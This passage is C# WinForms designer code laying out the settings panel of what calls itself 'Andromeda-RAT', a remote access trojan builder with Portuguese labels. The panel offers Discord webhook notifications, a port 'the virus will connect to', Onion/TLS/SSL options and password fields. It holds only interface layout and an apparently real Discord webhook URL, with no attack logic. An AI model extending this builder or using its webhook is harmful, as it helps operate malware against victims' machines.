            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel123);
            this.Guna2GradientPanel13.Controls.Add(this.guna2HtmlLabel51);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2PictureBox57);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2PictureBox66);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2PictureBox56);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2TextBox6);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2PictureBox55);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel104);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2PictureBox54);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2TextBox4);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2PictureBox53);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2TextBox5);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2PictureBox52);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel112);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2PictureBox50);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox1);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox3);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox11);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox4);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox10);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox5);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox9);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox6);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox8);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox7);
            this.Guna2Transition1.SetDecoration(this.Guna2GradientPanel13, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2GradientPanel13, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2GradientPanel13.Dock = System.Windows.Forms.DockStyle.Right;
            this.Guna2GradientPanel13.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2GradientPanel13.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2GradientPanel13.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.Guna2GradientPanel13.Location = new System.Drawing.Point(378, 0);
            this.Guna2GradientPanel13.Name = "Guna2GradientPanel13";
            this.Guna2GradientPanel13.Size = new System.Drawing.Size(706, 738);
            this.Guna2GradientPanel13.TabIndex = 96;
            // 
            // Guna2HtmlLabel118
            // 
            this.Guna2HtmlLabel118.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel118, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel118, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel118.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel118.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel118.Location = new System.Drawing.Point(17, 61);
            this.Guna2HtmlLabel118.Name = "Guna2HtmlLabel118";
            this.Guna2HtmlLabel118.Size = new System.Drawing.Size(204, 19);
            this.Guna2HtmlLabel118.TabIndex = 96;
            this.Guna2HtmlLabel118.Text = "Notificação do Discord WebHook";
            // 
            // Guna2Button3
            // 
            this.Guna2Button3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2Button3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Guna2Button3.BorderRadius = 6;
            this.Guna2Button3.BorderThickness = 1;
            this.Guna2Transition1.SetDecoration(this.Guna2Button3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2Button3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Button3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2Button3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2Button3.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2Button3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2Button3.FillColor = System.Drawing.Color.Transparent;
            this.Guna2Button3.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2Button3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(156)))), ((int)(((byte)(176)))));
            this.Guna2Button3.Image = ((System.Drawing.Image)(resources.GetObject("Guna2Button3.Image")));
            this.Guna2Button3.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2Button3.Location = new System.Drawing.Point(17, 356);
            this.Guna2Button3.Name = "Guna2Button3";
            this.Guna2Button3.Size = new System.Drawing.Size(271, 32);
            this.Guna2Button3.TabIndex = 101;
            this.Guna2Button3.Text = "Carregar arquivo";
            this.Guna2Button3.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            // 
            // Guna2TextBox7
            // 
            this.Guna2TextBox7.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Guna2TextBox7.BorderRadius = 3;
            this.Guna2TextBox7.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Guna2Transition1.SetDecoration(this.Guna2TextBox7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2TextBox7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2TextBox7.DefaultText = "https://discord.com/api/webhooks/1079197400641572874/DcVeYz0bkTxN-a8Yd_J48FT57qR9" +
    "9DzQhHhG0F";
            this.Guna2TextBox7.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.Guna2TextBox7.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.Guna2TextBox7.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox7.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox7.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2TextBox7.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox7.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2TextBox7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox7.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox7.IconLeft = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox7.IconLeft")));
            this.Guna2TextBox7.Location = new System.Drawing.Point(14, 86);
            this.Guna2TextBox7.Name = "Guna2TextBox7";
            this.Guna2TextBox7.PasswordChar = '\0';
            this.Guna2TextBox7.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox7.PlaceholderText = "BE012BGAJSYHEGSKFNHAVGDUGYWFWD";
            this.Guna2TextBox7.SelectedText = "";
            this.Guna2TextBox7.Size = new System.Drawing.Size(274, 29);
            this.Guna2TextBox7.TabIndex = 95;
            // 
            // Guna2HtmlLabel109
            // 
            this.Guna2HtmlLabel109.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel109, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel109, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel109.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel109.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel109.Location = new System.Drawing.Point(28, 516);
            this.Guna2HtmlLabel109.Name = "Guna2HtmlLabel109";
            this.Guna2HtmlLabel109.Size = new System.Drawing.Size(40, 19);
            this.Guna2HtmlLabel109.TabIndex = 88;
            this.Guna2HtmlLabel109.Text = "Senha";
            // 
            // guna2HtmlLabel49
            // 
            this.guna2HtmlLabel49.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel49, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel49, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel49.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel49.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel49.Location = new System.Drawing.Point(19, 41);
            this.guna2HtmlLabel49.Name = "guna2HtmlLabel49";
            this.guna2HtmlLabel49.Size = new System.Drawing.Size(149, 15);
            this.guna2HtmlLabel49.TabIndex = 85;
            this.guna2HtmlLabel49.Text = "Enviar notificação para você!";
            // 
            // Guna2HtmlLabel52
            // 
            this.Guna2HtmlLabel52.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel52, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel52, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel52.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel52.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel52.Location = new System.Drawing.Point(11, 132);
            this.Guna2HtmlLabel52.Name = "Guna2HtmlLabel52";
            this.Guna2HtmlLabel52.Size = new System.Drawing.Size(138, 19);
            this.Guna2HtmlLabel52.TabIndex = 67;
            this.Guna2HtmlLabel52.Text = "Conexão privada Onio";
            // 
            // Guna2HtmlLabel56
            // 
            this.Guna2HtmlLabel56.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel56, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel56, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel56.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel56.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel56.Location = new System.Drawing.Point(11, 13);
            this.Guna2HtmlLabel56.Name = "Guna2HtmlLabel56";
            this.Guna2HtmlLabel56.Size = new System.Drawing.Size(76, 19);
            this.Guna2HtmlLabel56.TabIndex = 67;
            this.Guna2HtmlLabel56.Text = "Notificações";
            // 
            // Guna2TextBox2
            // 
            this.Guna2TextBox2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Guna2TextBox2.BorderRadius = 3;
            this.Guna2TextBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Guna2Transition1.SetDecoration(this.Guna2TextBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2TextBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2TextBox2.DefaultText = "Password";
            this.Guna2TextBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.Guna2TextBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.Guna2TextBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2TextBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox2.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2TextBox2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox2.IconLeft = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox2.IconLeft")));
            this.Guna2TextBox2.IconRight = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox2.IconRight")));
            this.Guna2TextBox2.Location = new System.Drawing.Point(17, 210);
            this.Guna2TextBox2.Name = "Guna2TextBox2";
            this.Guna2TextBox2.PasswordChar = '*';
            this.Guna2TextBox2.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox2.PlaceholderText = "BE012BGAJSYHEGSKFNHAVGDUGYWFWD";
            this.Guna2TextBox2.SelectedText = "";
            this.Guna2TextBox2.Size = new System.Drawing.Size(271, 29);
            this.Guna2TextBox2.TabIndex = 89;
            // 
            // Guna2CheckBox15
            // 
            this.Guna2CheckBox15.Animated = true;
            this.Guna2CheckBox15.AutoSize = true;
            this.Guna2CheckBox15.BackColor = System.Drawing.Color.Transparent;
            this.Guna2CheckBox15.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox15.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox15.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox15.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox15.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox15, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox15, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CheckBox15.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox15.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox15.Location = new System.Drawing.Point(321, 405);
            this.Guna2CheckBox15.Name = "Guna2CheckBox15";
            this.Guna2CheckBox15.Size = new System.Drawing.Size(209, 19);
            this.Guna2CheckBox15.TabIndex = 117;
            this.Guna2CheckBox15.Text = "Layout 1x0 - Monitor 1920x1080";
            this.Guna2CheckBox15.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox15.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox15.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox15.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox15.UseVisualStyleBackColor = false;
            // 
            // Guna2HtmlLabel50
            // 
            this.Guna2HtmlLabel50.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel50, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel50, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel50.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel50.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel50.Location = new System.Drawing.Point(29, 164);
            this.Guna2HtmlLabel50.Name = "Guna2HtmlLabel50";
            this.Guna2HtmlLabel50.Size = new System.Drawing.Size(230, 15);
            this.Guna2HtmlLabel50.TabIndex = 85;
            this.Guna2HtmlLabel50.Text = "Configure a porta à qual o vírus se conectará";
            // 
            // Guna2HtmlLabel108
            // 
            this.Guna2HtmlLabel108.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel108, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel108, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel108.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel108.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel108.Location = new System.Drawing.Point(33, 457);
            this.Guna2HtmlLabel108.Name = "Guna2HtmlLabel108";
            this.Guna2HtmlLabel108.Size = new System.Drawing.Size(36, 19);
            this.Guna2HtmlLabel108.TabIndex = 87;
            this.Guna2HtmlLabel108.Text = "Porta";
            // 
            // Guna2HtmlLabel110
            // 
            this.Guna2HtmlLabel110.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel110, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel110, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel110.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel110.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel110.Location = new System.Drawing.Point(19, 185);
            this.Guna2HtmlLabel110.Name = "Guna2HtmlLabel110";
            this.Guna2HtmlLabel110.Size = new System.Drawing.Size(23, 19);
            this.Guna2HtmlLabel110.TabIndex = 90;
            this.Guna2HtmlLabel110.Text = "TLS";
            // 
            // Guna2CheckBox14
            // 
            this.Guna2CheckBox14.Animated = true;
            this.Guna2CheckBox14.AutoSize = true;
            this.Guna2CheckBox14.BackColor = System.Drawing.Color.Transparent;
            this.Guna2CheckBox14.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox14.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox14.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox14.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox14.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox14, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox14, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CheckBox14.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox14.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox14.Location = new System.Drawing.Point(321, 427);
            this.Guna2CheckBox14.Name = "Guna2CheckBox14";
            this.Guna2CheckBox14.Size = new System.Drawing.Size(123, 19);
            this.Guna2CheckBox14.TabIndex = 116;
            this.Guna2CheckBox14.Text = "5 segundo tempo";
            this.Guna2CheckBox14.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox14.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox14.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox14.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox14.UseVisualStyleBackColor = false;
            // 
            // Guna2TextBox3
            // 
            this.Guna2TextBox3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Guna2TextBox3.BorderRadius = 3;
            this.Guna2TextBox3.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Guna2Transition1.SetDecoration(this.Guna2TextBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2TextBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2TextBox3.DefaultText = "Password";
            this.Guna2TextBox3.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.Guna2TextBox3.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.Guna2TextBox3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox3.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2TextBox3.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox3.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2TextBox3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox3.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox3.IconLeft = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox3.IconLeft")));
            this.Guna2TextBox3.IconRight = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox3.IconRight")));
            this.Guna2TextBox3.Location = new System.Drawing.Point(17, 320);
            this.Guna2TextBox3.Name = "Guna2TextBox3";
            this.Guna2TextBox3.PasswordChar = '*';
            this.Guna2TextBox3.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox3.PlaceholderText = "9090";
            this.Guna2TextBox3.SelectedText = "";
            this.Guna2TextBox3.Size = new System.Drawing.Size(271, 29);
            this.Guna2TextBox3.TabIndex = 91;
            // 
            // Guna2TextBox1
            // 
            this.Guna2TextBox1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Guna2TextBox1.BorderRadius = 3;
            this.Guna2TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Guna2Transition1.SetDecoration(this.Guna2TextBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2TextBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2TextBox1.DefaultText = "Andromeda-RAT";
            this.Guna2TextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.Guna2TextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.Guna2TextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2TextBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2TextBox1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox1.IconLeft = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox1.IconLeft")));
            this.Guna2TextBox1.IconRight = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox1.IconRight")));
            this.Guna2TextBox1.Location = new System.Drawing.Point(29, 541);
            this.Guna2TextBox1.Name = "Guna2TextBox1";
            this.Guna2TextBox1.PasswordChar = '*';
            this.Guna2TextBox1.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox1.PlaceholderText = "*******";
            this.Guna2TextBox1.SelectedText = "";
            this.Guna2TextBox1.Size = new System.Drawing.Size(259, 29);
            this.Guna2TextBox1.TabIndex = 86;
            // 
            // Guna2HtmlLabel111
            // 
            this.Guna2HtmlLabel111.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel111, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel111, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel111.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel111.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel111.Location = new System.Drawing.Point(19, 295);
            this.Guna2HtmlLabel111.Name = "Guna2HtmlLabel111";
            this.Guna2HtmlLabel111.Size = new System.Drawing.Size(23, 19);
            this.Guna2HtmlLabel111.TabIndex = 92;
            this.Guna2HtmlLabel111.Text = "SSL";
            // 
            // Guna2CheckBox13
            // 
            this.Guna2CheckBox13.Animated = true;
            this.Guna2CheckBox13.AutoSize = true;
            this.Guna2CheckBox13.BackColor = System.Drawing.Color.Transparent;
            this.Guna2CheckBox13.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox13.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox13.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox13.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox13.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox13, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox13, Guna.UI2.AnimatorNS.DecorationType.None);
